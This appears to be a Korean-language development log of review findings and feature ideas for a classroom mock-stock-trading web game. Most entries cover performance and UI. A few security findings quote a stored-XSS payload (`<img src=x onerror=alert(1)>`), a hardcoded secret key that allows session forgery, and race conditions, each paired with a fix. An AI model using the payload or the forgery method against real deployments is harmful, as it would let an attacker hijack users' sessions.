- **`loadGuides()`, `loadTips()` 탭 전환마다 서버 재호출, 캐시 없음** (`app.js:1933`, `app.js:1956`): 학습 탭 전환 시 매번 `GET /api/education/guides` 와 `GET /api/education/tips` 호출. 내용이 정적임에도 캐시가 없어 낭비. `S.guidesData = []`, `S.tipsData = []` 상태 변수를 추가하고 각 함수 첫 줄에 데이터가 있으면 재요청 없이 렌더링하는 가드를 추가. `S.glossaryData`(`app.js:16`) 패턴 그대로 적용, 각 함수 3줄씩 추가.

### 제거/단순화할 것들

- **`get_rankings()`·`host_members()`에서 참가자당 최대 3건 쿼리 발생 (N×3 문제)** (`app.py:807-824`, `app.py:542-562`): `member_total_value(rid, uid)` 가 멤버별로 `RoomMember`, `RoomHolding`, `Deposit` 세 테이블을 각각 쿼리함. 30명 교실에서 랭킹 조회 1회에 최대 90쿼리 발생, 10초 폴링 기준 분당 540쿼리. `RoomHolding.query.filter_by(room_id=rid).all()` + `Deposit.query.filter_by(room_id=rid, status='active').all()` 로 방 전체를 한 번에 조회 후 Python 딕셔너리로 집계하면 쿼리 수를 3으로 고정. Render 무료 PostgreSQL 연결 지연이 크므로 체감 속도 개선 가장 명확.

- **`Room.query.get()` deprecated 호출 다수 잔존** (`app.py:977`, `app.py:435` 외): SQLAlchemy 2.x에서 `Query.get()` 제거 예정. `grep -n "\.query\.get"` 결과 `minigame_close()` (`app.py:977`) 등 여러 위치에서 구형 API 사용 중. `db.session.get(Room, rid)` 로 일괄 교체 필요. `get_or_404()` 패턴은 `db.get_or_404(Room, rid)` (Flask-SQLAlchemy 3.x) 로 교체. 실행 오류는 아니지만 버전 업그레이드 시 일괄 파손 위험.

- **`force_sector_event()` 실행 후 자동 가격 틱에서 이벤트 방향 상쇄** (`stock_service.py:244-276`): 섹터 이벤트로 가격을 강제 변경해도 `_next_biases` 딕셔너리가 갱신되지 않아, 직후 자동 가격 변동 틱에서 랜덤 방향으로 부분 상쇄될 수 있음. 루프 내에 `self._next_biases[sym] = 'up' if pct > 0 else 'down'` 1줄 추가하면 이벤트 효과가 다음 자동 틱까지 이어져 교사 연출 의도가 강화됨. `force_price()` (`stock_service.py:218-242`)에도 동일 패턴 적용.

- **`_init_prices()`에서 모든 종목 TTL이 동시 만료되는 thundering herd** (`stock_service.py:121-128`): 게임 시작 시 `self._prices[sym] = (now, start)` 가 모든 47개 종목에 동일한 `now` 타임스탬프로 초기화되어 첫 TTL(기본 20초) 만료 시 다음 poll에서 47개 가격이 동시에 재계산됨. 학생 30명이 동시에 시세를 조회하면 같은 순간 47×30개의 `_next_price()` 계산이 몰림. `self._prices[sym] = (now - random.uniform(0, PRICE_TTL * 0.8), start)` 처럼 초기 타임스탬프에 지터를 추가해 만료 시점을 분산 권장. 1줄 수정.

- **`minigame_open()` 카운터가 학생 브라우저 강제 종료 시 누수, 게임 영구 paused 위험** (`app.py:938-963`, `app.py:965-994`): `_rlt_active[rid]['count']` 는 `minigame/open`으로 증가하지만 브라우저 강제 종료 시 `minigame/close` POST가 발송되지 않아 카운트가 영구 잔존. count가 0에 도달하지 않으면 게임 재개 트리거가 없어 룰렛 세션이 멈춘 채 방이 영구 pause 상태 유지 가능. `_rlt_active[rid]` 에 `'opened_at': time.time()` 타임스탬프 추가 후 `get_room()` 폴링 시(`app.py:432`) 5분 이상 경과하면 자동 reset + 게임 재개하는 안전장치 권장. 서버 약 8줄 추가.

## 2026-07-05

### 추가하면 좋을 기능

- **진행자 호스트 탭에 실시간 자산 변화 라이브 막대 그래프 추가** (`app.js:enterHostGame()`, `app.py:542`): 현재 호스트의 '순위' 탭에는 정적 테이블만 있어 수업 중 "지금 1위는 누구?"를 묻기 어려움. `host_members` API(`app.py:542`)가 이미 `total_value`·`gain_pct`를 반환하므로, `S.pollInterval`(10초) 시마다 Chart.js 수평 막대 그래프를 갱신하면 학생 자산 분포를 실시간으로 시각화 가능. `hostBarChart`(`app.js:7`)가 이미 선언만 돼 있어 초기화 로직만 추가하면 됨. 호스트 화면에 40줄 이내 추가.

- **Notification API를 활용한 뉴스 백그라운드 푸시** (`app.js:806-826`, `showBombNews()`): 학생이 다른 브라우저 탭을 보고 있으면 폭탄 뉴스 팝업을 놓침. `startNewsPolling()` 내 뉴스 감지 시 `Notification.requestPermission()`을 게임 진입 시점에 한 번 요청하고, 새 뉴스 도착 시 `new Notification(headline)` 호출을 추가하면 됨. 백엔드 변경 없이 프론트 15줄 추가, 수업 집중도·반응성 향상.

- **포트폴리오 섹터 다각화 점수 및 섹터별 분포 시각화** (`app.py:780-803`, `app.js:1480-1503`): `get_portfolio()`가 반환하는 `holdings`에는 이미 `sector` 필드가 있어 클라이언트에서 섹터별 합계를 집계 가능. 도넛 차트(`app.js:1483`)의 레이블을 종목명 대신 섹터명으로 그룹화하는 옵션 버튼을 추가하면 학생들이 분산투자 개념을 직관적으로 학습 가능. 한 섹터에 전 자산이 집중되면 "집중 투자 경고" 배지를 표시하는 로직도 20줄 이내 구현 가능.

- **방 설정 복사("방 복사") 기능으로 매 수업 재설정 부담 감소** (`app.py:363-390`, `app.js:doCreateRoom()`): 수업이 끝난 방(`status='ended'`)의 `name`·`duration_minutes`·`starting_cash`·`deposit_rate` 설정을 그대로 복사해 새 방을 만드는 "이 설정으로 다시 시작" 버튼을 결과 화면 진행자 영역에 추가. `POST /api/rooms`에 `template_room_id` 선택 파라미터를 추가하고, 지정된 방이 있으면 해당 방의 설정을 기본값으로 적용하면 됨. 백엔드 10줄, 프론트 15줄 수정.

- **퀴즈 참여·정답률 통계 진행자 집계 뷰** (`app.py:1245-1342`, `_quiz_state`): 현재 `_quiz_state`에는 `seen` 집합과 `cooldown_until`만 저장되어 진행자가 누가 퀴즈에 얼마나 참여했는지 알 수 없음. `_quiz_state[key]`에 `correct_count`, `wrong_count`를 추가하고(`submit_quiz()` 내 2줄 증가 로직), `GET /api/rooms/<rid>/host/quiz-stats` 엔드포인트를 신설해 참여 횟수·정답률 집계를 반환하면, 진행자가 수업 중 학생 참여도를 모니터링하고 수업 후 형성 평가 자료로 활용 가능.

- **대용량 단일 거래 실행 전 확인 팝업** (`app.js:1424-1454`, `app.py:724-767`): 현재 단일 거래 수량에 서버·클라이언트 양쪽 모두 상한이 없음. 주가 낮은 종목(HMM 약 17,000원)을 5,000주 매수하면 8,500만 원이 한 번에 소진됨. `execTrade()` 내 `amount = shares × S.tradePrice`가 `S.room.starting_cash × 0.3` 초과 시 `confirm('총 거래금액 X원 — 계속하시겠습니까?')` 다이얼로그를 삽입하면 실수로 인한 대량 매수·매도를 방지. 클라이언트 5줄 추가, 서버 변경 불필요.

### 제거/단순화할 것들

- **`Room.query.get(rid)` 레거시 호출 1개 잔존** (`app.py:976`): `minigame_close()` 함수 내부에서 `room = Room.query.get(rid)`을 사용하고 있어 SQLAlchemy 2.0에서 제거된 `Query.get()` API에 의존. 나머지 코드 전체는 `db.session.get(Room, rid)` 패턴으로 이미 마이그레이션됐음. 해당 1줄을 `db.session.get(Room, rid)`으로 교체하면 SQLAlchemy 2.x 완전 호환 달성. `get_or_404` 계열은 Flask-SQLAlchemy 헬퍼라 별도 이슈.

- **`t.note` HTML 미이스케이프로 인한 저장형 XSS 가능** (`app.js:1581`, `app.py:596`): 거래 내역 렌더링 `loadTxn()`에서 `` ${t.note ? ' · ' + t.note : ''} ``를 그대로 `innerHTML`에 삽입. `note` 값은 진행자가 `host_adjust()` 호출 시 `d.get('note', '진행자 자산 조정')`으로 임의 문자열을 저장 가능(`app.py:596`). 악의적인 진행자가 `<img src=x onerror=alert(1)>` 같은 페이로드를 입력하면 해당 거래 내역을 보는 모든 학생에게 실행됨. `app.js:897`에 이미 `escHtml()` 함수가 정의돼 있으므로 `escHtml(t.note)`로 교체해 1줄 수정으로 해결.

- **룰렛·퀴즈 강제 청산 후 `RoomHolding` 0주 레코드 미삭제** (`app.py:1037-1038`, `app.py:1318`): 룰렛 베팅 자금 마련(`app.py:1025-1047`)과 퀴즈 오답 패널티(`app.py:1302-1326`) 코드에서 전량 청산 시 `h.shares = 0; h.avg_price = 0`만 설정하고 레코드를 삭제하지 않음. 반면 일반 매도 로직(`app.py:762`)은 `if holding.shares == 0: db.session.delete(holding)`으로 올바르게 처리. 0주 잔여 레코드는 `get_portfolio()` 조회 시 `h.shares <= 0` 조건 필터링(`app.py:783`)으로 출력은 막히지만, `RoomHolding.query.filter_by(...)` 쿼리 결과 집합을 불필요하게 키워 청산 반복 시 DB 부하 누적. 두 경로 모두 `db.session.delete(h)` 추가로 통일.

- **`get_rankings()` N+1 쿼리 문제** (`app.py:815-824`): 멤버 N명에 대해 루프 내 `db.session.get(User, m.user_id)` 1회 + `member_total_value()`(내부에서 `RoomMember·RoomHolding·Deposit` 각 1회) = 총 4N+1개 DB 쿼리 발생. 30명 클래스에서 121 쿼리/요청이며, `S.pollInterval`(10초)로 전원이 동시 조회하면 초당 3,600 쿼리 가능. `User.id.in_(uids)` 배치 조회 + `RoomHolding.query.filter_by(room_id=rid)` 전체 1회 조회 후 Python 딕셔너리로 그룹화하면 O(1) 쿼리로 단축. `host_members()`(`app.py:548`)도 동일 패턴이라 같이 개선 필요.

- **`_room_cache`·`_news_cache`가 종료된 방 데이터를 무한 누적** (`app.py:43-84`): `_invalidate_room_cache(rid)` / `_invalidate_news_cache(rid)`는 방 종료 시 해당 키를 삭제하지만, `_end_room()`에서 호출되는 시점 이후 재조회가 없으므로 사실상 남아있지 않을 것처럼 보임. 그러나 방이 종료돼도 `get_room()` 폴링은 계속 캐시를 갱신(TTL 만료마다 재삽입)할 수 있고, 크기 상한이 없으므로 대규모 배포 환경에서 수백 개 방이 메모리를 점유 가능. `_room_cache`를 `collections.OrderedDict`로 교체하고 `maxsize=200` 초과 시 가장 오래된 항목을 제거하는 LRU 로직을 추가해 5줄로 해결.

- **하드코딩된 `SECRET_KEY` 폴백으로 세션 위조 가능** (`app.py:13`): `app.secret_key = os.environ.get('SECRET_KEY', 'mock-stock-game-secret-2024')`은 환경 변수가 설정되지 않으면 공개된 기본 키를 사용. 이 키를 아는 누구든 `itsdangerous` 라이브러리로 유효한 Flask 세션 쿠키를 생성해 임의 `user_id`로 로그인한 것처럼 위장 가능. Render 같은 PaaS 배포 시 환경 변수 설정을 빠뜨리는 실수가 쉬움. `if not os.environ.get('SECRET_KEY'): raise RuntimeError('SECRET_KEY env var must be set')` 한 줄로 배포 시 명시적 오류를 발생시키는 것이 안전.

## 2026-07-06

### 추가하면 좋을 기능

- **진행자 화면에서 학생 개인 보유 종목 확인 기능** (`app.py:542-561`, `app.js:408-431`): 현재 진행자는 `host_members()` API로 학생의 총 자산·수익률만 볼 수 있고, 어떤 종목을 얼마나 보유하는지 알 수 없음. `GET /api/rooms/<rid>/host/members/<uid>/portfolio` 엔드포인트를 신설해 `get_portfolio()` 로직(`app.py:772-803`)을 그대로 재사용하면 됨 (권한 체크를 `host_id`로 변경). 수업 중 "이 학생은 왜 삼성전자를 이렇게 많이 사뒀을까요?"처럼 포트폴리오를 교육 소재로 활용 가능. 백엔드 20줄, 프론트 학생 행 클릭 시 모달 표시 30줄.

- **거래 내역 배지에 룰렛·복권 액션 표시 추가** (`app.js:529`, `app.js:1584`): 호스트 학생 거래 내역(`loadStudentTxn()`)과 참가자 본인 거래 내역(`loadTxn()`) 모두 `t.action==='BUY'?'매수':t.action==='SELL'?'매도':'조정'` 삼항 체인을 사용해 `RLT`(룰렛)와 `LOTTO`(복권) 거래가 '조정'으로 잘못 표시됨. `'RLT'?'룰렛':'LOTTO'?'복권':'조정'` 분기를 추가하면 2개 파일 각 1줄 수정으로 해결되며, 학생이 자신의 미니게임 거래 이력을 정확히 구분 가능.

- **게임 시작 전 최소 참가자 수 경고** (`app.js:246-255`, `app.py:475-488`): `doStartGame()`이 참가자 0명일 때도 서버에 요청을 보내 게임이 시작됨. 클라이언트에서 `S.room.member_count === 0`이면 `if (!confirm('참가자가 없습니다. 그래도 시작하시겠습니까?'))` 확인 팝업을 추가하거나, 서버 `start_room()`(`app.py:475`)에 참가자 수 체크를 추가하면 빈 방 게임 실수 방지. 특히 Render free tier에서는 스핀업 지연으로 학생이 아직 접속 전에 시작 버튼을 누르는 상황이 흔함.

- **로비 QR 코드 이미지 저장 기능** (`app.js:195-210`, `static/index.html:93`): `generateLobbyQR()`이 QRCode.js로 canvas에 QR을 그리지만, 저장·공유 버튼이 없음. 로비 QR 옆에 `canvas.toBlob()` → `<a download="qr.png">` 방식으로 PNG 저장 버튼을 추가하면, 선생님이 카카오톡·밴드 등으로 QR 이미지를 공유해 학생들이 카메라로 즉시 접속 가능. 프론트 10줄, 서버 변경 없음.

- **뉴스 간격·주가 변동 간격 설정이 서버 재시작 시 초기화됨** (`app.py:630-646`, `stock_service.py:197-216`): `svc.set_news_interval()`, `svc.set_price_interval()` 값은 `StockService` 인스턴스 메모리에만 저장되어 Render free tier 슬립→웨이크업 시 초기화됨. `Room` 모델에 `news_interval_seconds`, `price_interval_seconds` 컬럼을 추가하고 방 로드 시 `StockService`에 적용하면, 설정 지속성 확보. Render 무료 플랜에서 15분 비활동 슬립은 수업 중에도 발생 가능.

- **결과 화면에서 학생 본인의 매수·매도 횟수 요약 표시** (`app.py:829-847`, `app.js:1760-1777`): 결과 화면의 "내 결과" 카드(`results-my-stats`)는 최종 순위·자산·수익률 3가지만 표시. `GET /api/rooms/<rid>/transactions`로 자신의 거래 내역 전체를 조회(이미 구현됨)해 `buy_count`, `sell_count`를 집계하고 "총 XX번 거래" 문구를 추가하면 학생이 자신의 투자 활동을 돌아볼 수 있는 교육적 피드백 제공. 프론트 15줄, 서버 변경 없음.

### 제거/단순화할 것들

- **`stock_service.py:get_history()` 의 period 구분이 무의미** (`stock_service.py:281-310`): "1일/1주/1달/3달/1년" 탭 중 `period='1d'`와 `period='1mo'` 모두 `n_bars=30` 동일하고(`{'1d':30, '5d':5, '1mo':30, '3mo':90}` 매핑), 히스토리 전체가 현재가 기준 역방향 랜덤 워크로 생성되어 실제 시간 축이 없음. 학생이 "1일 차트"와 "1달 차트"를 비교해도 사실상 같은 노이즈. 차트 탭을 "단기(30봉)/중기(90봉)" 2개로 단순화하거나, 게임 내 실제 가격 변동 이력을 `StockService._history_log`에 누적하는 방향으로 교체하는 편이 교육적으로 더 의미 있음.

- **`app.js:S.assetHistory`가 새로고침·재접속 시 리셋** (`app.js:19`, `app.js:1505-1540`): 포트폴리오 탭의 "자산 변화" 라인 차트는 `S.assetHistory` 메모리 배열 기반. 학생이 브라우저 새로고침을 하면 데이터가 사라지고 빈 차트를 보게 됨(2개 이상 데이터 포인트가 없으면 차트 자체가 숨겨짐, `app.js:1506`). `sessionStorage`에 주기적으로 저장하거나, 아니면 "자산 변화" 섹션을 제거하고 랭킹 탭에서 실시간 순위 변화를 확인하도록 안내하는 쪽이 더 실용적.

- **`doAuth()` 학번+이름 공백 join 방식의 파싱 취약성** (`app.js:73-76`, `app.js:1695-1699`, `app.py:1435-1437`): `username = \`${sid} ${name}\`` 으로 저장하고, `parseUsername()` / 엑셀 내보내기에서 `split(' ', 1)` 또는 `parts[0]`, `parts[1]` 로 다시 분리. 이름에 공백이 포함된 경우(예: "이 지영") 학번·이름 구분이 깨져 엑셀 출력에서 학번 컬럼에 이름 일부가 들어감. 분리자를 `|` 또는 `\t` 같은 입력 불가 문자로 변경하면 3개 파일 각 1줄 수정으로 해결.

- **`get_rankings()` 폴링과 `refreshMyRank()` 폴링이 중복 호출** (`app.js:613-651`): `S.pollInterval`(10초) 안에서 `refreshMyRank()`가 `/rankings` API를 호출하고, 참가자가 순위 탭을 열면 `loadParticipantRankings()`도 `/rankings`를 호출해 같은 엔드포인트가 최대 10초 내 2회 중복 호출됨. `refreshMyRank()`에서 `/rankings` 전체를 받아 `S.rankingsData`에 저장하고, `loadParticipantRankings()`는 별도 API 호출 없이 캐시 데이터를 렌더링하는 방식으로 단일화하면 서버 부하를 절반으로 줄일 수 있음.

- **`kick_member()` 엔드포인트가 waiting 상태에서만 동작** (`app.py:566-575`): 서버에서 `room.status != 'waiting'`이면 강퇴 불가 오류를 반환하지만, 클라이언트 로비 화면의 강퇴 버튼은 대기 중에만 표시되어 이중 검증이 중복. 서버측 체크는 유지하되, 클라이언트에서 추가 확인 없이 버튼만 조건부 렌더링하면 충분. 또한 강퇴 대상자 본인은 여전히 방 조회(`/api/rooms/<rid>`) 시 방 정보를 받아볼 수 있어, 강퇴 감지 로직이 없으면 강퇴된 학생이 대기 화면에서 계속 머물게 됨. 참가자 폴링에서 `RoomMember` 조회 실패 시 로비 이탈 처리를 추가하는 것이 필요.


## 2026-07-06

### 추가하면 좋을 기능

- **게임 종료 30초 전 긴박감 시각·청각 효과** (`app.js:770-795 startTimer()`, `app.py:527-537 end_room()`): `_ending_soon` 플래그가 설정되면 진행자 화면에는 "1분 후 종료" 토스트가 뜨지만, 학생 화면의 타이머에는 시각적 변화가 없음. `remaining_seconds <= 30` 조건에서 타이머 숫자를 빨간색으로 변경하고, `@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }` 애니메이션을 타이머 컨테이너에 적용하면 학생들이 마감을 직관적으로 인지. `startTimer()` 내 `tick()` 함수에서 `if (remaining <= 30) el.style.color = 'var(--down)'` 1줄 추가, 서버 변경 불필요. `Web Audio API` `OscillatorNode`로 카운트다운 비프음을 추가하면 완성도 향상.

- **진행자 학생 이름 수정 기능** (`app.py:542-562 host_members()`, `models.py:User`): 학생이 오타로 이름을 잘못 입력해도 진행자가 수정할 방법이 없어 엑셀 결과물에 오류가 그대로 남음. `PUT /api/rooms/<rid>/host/members/<uid>/rename` 엔드포인트(`body: {username: "수정된 이름"}`)를 추가하고, `User.username`을 업데이트하면 됨. `username` 길이 2~30 기존 검증 재사용, 중복 username 예외 처리 포함. 진행자 순위 행에 "✏️" 버튼을 추가하는 것으로 프론트 완성. 백엔드 15줄, 프론트 20줄 수정.

- **복권 번호 제출 후 재선택 기능** (`app.py:1149-1183 lottery_pick()`, `app.js: _startLotPolling()`): `lottery_pick()`은 이미 제출된 번호를 `cur['picks'][str(user.id)] = nums` 로 덮어쓰므로 서버 로직 자체는 재선택을 허용. 하지만 클라이언트 UI에서 번호를 제출하면 입력 필드가 `disabled` 처리돼 변경 불가. `state === 'picking'` 이고 `my_picks` 가 이미 있을 때 "번호 변경" 버튼을 표시하고 클릭 시 필드를 다시 활성화하면, 실수로 잘못 입력한 학생이 마감 전까지 수정 가능. 프론트 10줄 추가, 서버 변경 불필요.

- **Kahoot-식 진행자 주도 동시 O/X 퀴즈** (`app.py:1243-1342 Quiz`, `app.js:846-900 submitQuiz()`): 현재 퀴즈는 학생이 개별적으로 언제든 시작하는 비동기 방식. 진행자가 `POST /api/rooms/<rid>/host/ox-start {qid}` 로 특정 문제를 "동시 공개"하고, 학생이 O/X를 누르면 결과를 집계해 `POST /api/rooms/<rid>/host/ox-reveal`로 정답·참여율을 한 번에 공개하는 동기식 미니게임을 추가하면 수업 몰입도가 크게 향상됨. `_quiz_state` 딕셔너리에 `ox_active` 키를 추가하고, `get_room()` 폴링 응답에 `ox_active: {qid, deadline}`을 포함. 백엔드 40줄, 프론트 50줄 예상.

- **거래 내역 클립보드 복사 / CSV 다운로드** (`app.py:829-847 get_transactions()`, `app.js:1565-1593 loadTxn()`): 학생이 수업 후 자신의 거래 이력을 복기하려면 진행자의 엑셀 파일을 요청해야 함. `loadTxn()` 완료 후 전체 거래 내역(`data.transactions`)을 CSV 형태로 `Blob` 생성 → `<a download="거래내역.csv">` 로 저장하는 버튼 하나를 추가하면, 학생이 직접 스프레드시트로 투자 분석 가능. `page=1` 기준으로 `per_page=200` 파라미터를 추가해 단일 요청으로 전체 내역을 받아오는 별도 호출 방식 권장. 백엔드 파라미터 1줄 수정, 프론트 20줄 추가.

- **진행자 특정 종목 거래 일시 차단 (서킷 브레이커)** (`app.py:724-767 trade()`, `stock_service.py:166-172 freeze()`): 현재 `StockService.freeze()`는 모든 종목 가격 갱신을 동시에 멈추지만, 특정 종목만 거래 차단하는 기능은 없음. `_blocked_symbols: set` 을 `StockService`에 추가하고, `trade()` 상단에서 `if symbol in svc._blocked_symbols: return 403` 검사를 삽입하면, 진행자가 "삼성전자 거래 차단" 이벤트를 통해 실제 주식시장의 서킷 브레이커 개념을 실습 가능. `POST /api/rooms/<rid>/host/block-symbol {symbol, blocked: bool}` 엔드포인트 20줄, `trade()` 1줄 추가.

---

### 제거/단순화할 것들

- **`lottery_draw()` 에서 `_lottery_lock` 없이 `_do_reveal()` 호출 — 이중 지급 경쟁 조건** (`app.py:1206`): `lottery_draw()` 는 `_lottery_lock` 을 획득하지 않은 상태에서 `_do_reveal(rid, cur)` 를 직접 호출. 동시에 `get_lottery()` 폴링(`app.py:1123-1130`)이 `_lottery_lock` 내부에서 `draw_dl` 만료를 감지해 `_do_reveal()` 을 호출하면, 두 경로가 경쟁하면서 복권 보상이 두 번 지급될 수 있음. `lottery_draw()` 의 `_do_reveal(rid, cur)` 호출 전에 `with _lottery_lock:` 블록을 추가하고, 블록 내에서 `cur['state'] == 'drawing'` 여부를 재확인한 뒤 호출해야 안전 (`app.py:1205-1206`).

- **`host_market_event()` 이후 `_news_cache` 미무효화** (`app.py:1357-1360`): `force_sector_event()` 내부에서 `self._news` 를 직접 갱신하지만(`stock_service.py:270-275`), `app.py:1360` 반환 직전에 `_invalidate_news_cache(rid)` 호출이 없음. `host_force_price()` (`app.py:684-687`)와 `host_send_news()` (`app.py:700`)는 뉴스 캐시를 무효화하는 반면 섹터 이벤트만 예외. 2초 NEWS_CACHE_TTL 동안 학생은 이전 뉴스를 계속 받아 섹터 이벤트 연계 뉴스를 놓칠 수 있음. `app.py:1360` `return jsonify(...)` 직전에 `_invalidate_news_cache(rid)` 한 줄 추가로 해결.

- **`withdraw_deposit()` 에 `RoomTransaction` 기록 없어 거래 내역 불완전** (`app.py:904-916`): 룰렛 베팅 예금 인출(`app.py:1056-1058`)과 퀴즈 오답 패널티 예금 차감(`app.py:1336-1338`)은 각각 `RoomTransaction(action='ADJ')` 을 남기지만, `withdraw_deposit()` 는 예금 금액을 `m.cash`에 환원하면서 거래 로그를 남기지 않음. 학생의 "내 거래 내역" 화면에서 현금 증가 이유를 설명할 수 없어 교육적 혼란 유발. `db.session.add(RoomTransaction(room_id=rid, user_id=user.id, symbol='DEPOSIT', action='ADJ', shares=0, price=0, amount=dep.amount, note='예금 조기 해지'))` 를 `app.py:915` `commit()` 전에 삽입하면 일관성 확보.

- **`create_deposit()` 금액 검증이 `float('inf')` 비교에 의존해 소수점 예금 허용** (`app.py:887-889`): `amount = float(...)` 후 `if not (0 < amount < float('inf'))` 조건은 `amount = 0.001` 같은 소수점 값을 허용. `Deposit.amount` 컬럼이 `db.Float`이라 DB에도 저장되고, 이자 계산(`d.amount * d.rate / 100`) 시 `0.001 * 3 / 100 = 0.00003` 같은 미세 부동소수점 값이 누적됨. `if amount < 1000: return jsonify({'error': '최소 예금 금액은 1,000원'}), 400` 하한 가드와 `amount = int(amount)` 정수 절사를 `app.py:889` 직후에 추가하면 소액 레코드·부동소수점 오차 양쪽을 방어.

- **`get_quiz()` 에서 진행자도 퀴즈 문제 조회 가능 — 학생에게 사전 유출 위험** (`app.py:1248-1268`): `@login_required` + `room.status != 'active'` 만 체크하고 `cur_user().id == room.host_id` 여부를 확인하지 않아, 진행자도 `GET /api/rooms/<rid>/quiz` 로 퀴즈 문제를 열람할 수 있음. 학생에게 힌트를 주거나 O/X 답을 미리 전달하는 편법이 가능. `app.py:1253` 에 `if cur_user().id == room.host_id: return jsonify({'error': '진행자는 퀴즈에 참여할 수 없습니다.'}), 403` 가드를 삽입. `submit_quiz()` (`app.py:1272`) 에도 동일 가드 추가 권장 (현재는 member 없으면 단순히 cash 변경 없이 200 반환).

- **`_roulette_config` POST 시 꽝(index 0) 배수 값이 소리 없이 0 으로 강제 설정됨** (`app.py:1378`): `mults = [0] + [max(0, float(x)) for x in raw_m[1:]]` 패턴으로 클라이언트가 제출한 `raw_m[0]` 값을 항상 버리고 0 으로 교체. API 응답은 `{'multipliers': mults}` 로 실제 저장된 값을 반환하므로 UI에서 차이를 발견할 수 있지만, 요청이 200 OK 로 처리되어 직관적이지 않음. `if float(raw_m[0]) != 0: return jsonify({'error': '첫 번째 슬롯(꽝)의 배수는 반드시 0이어야 합니다.'}), 400` 검증을 추가하거나, 클라이언트 진행자 설정 UI(`index.html` 룰렛 설정 모달)에서 첫 번째 입력 필드를 `readonly value="0"` 으로 고정하면 혼란 방지 (`app.py:1378`).

- **`trade()` 에서 동시 매수 요청 시 현금 TOCTOU 취약점** (`app.py:733-765`): `member.cash >= amount` 확인 후 `member.cash -= amount` 사이에 아무런 DB 수준 잠금 없음. SQLite WAL 모드에서는 단일 쓰기 스레드로 직렬화되어 실질 위험은 낮지만, PostgreSQL 이전 시 두 탭이 동시에 같은 계정으로 매수 요청을 보내면 둘 다 잔액 충분 판정을 받아 현금이 음수로 내려갈 수 있음. `RoomMember.query.filter_by(room_id=rid, user_id=user.id).with_for_update().first()` (행 수준 배타 잠금)로 교체하면 PostgreSQL에서도 안전. SQLite에서는 `with_for_update()`가 무시되므로 하위 호환 영향 없음 (`app.py:733`).


## 2026-07-07

### 추가하면 좋을 기능

- **진행자 전체 참가자 일괄 자산 조정 엔드포인트** (`app.py:587-603`, `app.js:480-501`): 현재 `openAdjust()` 는 학생 1명씩 개별 모달을 열어야 하므로, 수업 중 "전체 +50만원 이벤트 보너스" 같은 상황에서 30명을 일일이 클릭해야 함. `POST /api/rooms/<rid>/host/adjust-all {delta, note}` 엔드포인트를 `host_adjust()` 로직(`app.py:587`) 기반으로 추가하고, 설정 탭에 "전체 일괄 조정" 버튼 하나만 추가하면 해결. 백엔드 15줄, 프론트 10줄.

- **복권 결과 모달에 참가자 이름 표시** (`app.py:1131-1147`, `app.js:2219-2244`): 진행자 복권 결과 모달(`_showLotteryResult()`)의 결과 표가 UID(숫자 문자열)를 키로 당첨 번호·일치 개수·당첨금만 보여주고 학생 이름이 없음. 진행자가 누가 당첨됐는지 바로 알 수 없음. `get_lottery()` 의 `all_results` 반환(`app.py:1145`)에 `db.session.get(User, int(uid_str)).username` 조회를 추가해 `username` 필드를 포함하면, 프론트 표 컬럼 하나 교체만으로 "홍길동 — 6개 일치 1등!" 발표 가능.

- **참가자 탭 비활성 시 중요 이벤트 브라우저 알림** (`app.js:625-651`): 참가자가 다른 탭에서 공부하다가 룰렛/복권 등장을 놓치는 상황이 교실에서 흔함. `document.addEventListener('visibilitychange', ...)` + `Notification API` 를 조합해 탭이 비활성 상태에서 `r.minigame_available` 또는 `r.lottery_active` 가 감지되면 `new Notification('🎰 룰렛이 등장했습니다!')` 를 전송하면 됨. 초기 진입 시 `Notification.requestPermission()` 한 번만 호출. 서버 변경 불필요, 프론트 15줄.

- **URL `?code=` 파라미터 접속 시 기존 세션 선복구** (`app.js:2308-2316`): QR 코드·공유 링크로 `?code=ABC123` 접속 시 `join-code` 입력창만 채우고 바로 `showScreen('screen-join')`으로 이동. 이전 게임 세션이 남아 있으면 `join_room()` 호출 시 "이미 진행 중인 방" 오류가 발생하거나 엉뚱한 방으로 이동할 수 있음. URL 코드 감지 후에도 `api.get('/api/auth/me')` 를 먼저 호출해 `active_room`을 확인하고, 다른 방 세션이 없을 때만 join 화면을 보여주도록 `app.js:2308` 블록을 수정하면 안전.

- **진행자 대시보드에 학생별 시간대 자산 추이 라인 차트** (`app.js:408-431`, `app.js:432-478`): 진행자 순위 탭에 수평 막대 차트(`host-bar-chart`)가 있지만 시간에 따른 자산 변화는 없음. 학생 화면의 `S.assetHistory` 패턴과 같이 `hostAssetHistory: {}` (user_id → 시간별 자산 배열)를 `loadHostMembers()` 호출마다 누적하고, 상위 5명의 자산 라인을 Chart.js 멀티 데이터셋으로 렌더링하면 "이 순간 역전이 일어났다" 지점을 교육 소재로 활용 가능. 서버 변경 불필요, 프론트 30줄.

- **결과 화면에서 거래 횟수·최고 수익 종목 요약 제공** (`app.py:829-847`, `app.js:1760-1777`): 결과 화면의 "내 결과" 카드(`results-my-stats`)는 순위·자산·수익률 3가지만 표시. `GET /api/rooms/<rid>/transactions` (이미 구현됨)를 단 한 번 호출해 `buy_count`, `sell_count`, 가장 많이 이익을 낸 종목을 집계하고 "총 18번 거래 · 가장 수익이 좋은 종목: 삼성바이오로직스 +23.1%"를 추가하면 수업 후 자기 투자 스타일 성찰 활동에 활용 가능. 프론트 20줄, 서버 변경 불필요.

### 제거/단순화할 것들

- **`api` 객체에 네트워크 예외 처리 미적용** (`app.js:29-45`): `api.get()`, `api.post()`, `api.del()` 모두 `fetch()` 가 던지는 네트워크 예외(오프라인, Render 슬립 중 타임아웃 등)를 잡지 않아, 호출부 대다수가 try-catch 없이 `const data = await api.post(...)` 패턴을 쓰므로 `data` 가 undefined가 되면 `data.error` 참조에서 런타임 에러로 UI가 완전히 멈춤. `api.get/post/del` 각각 `fetch(...)` 를 `try { ... } catch { return {error: '네트워크 오류'}; }` 로 감싸면 3개 함수 각 2줄 추가로 전체 호출부 보호.

- **로비 아바타가 항상 학번 첫 숫자를 표시** (`app.js:228`, `app.js:583`): `m.username[0].toUpperCase()` 에서 `username`은 "20715 홍길동" 형식이므로 호스트 로비(`loadLobbyMembers`)와 참가자 로비(`loadPLobbyMembers`) 양쪽 모두 아바타가 '2' 같은 숫자를 표시함. `m.username.split(' ').slice(1).join(' ')[0] || m.username[0]` 으로 이름 첫 글자를 추출하면 각 파일 1줄 수정으로 해결.

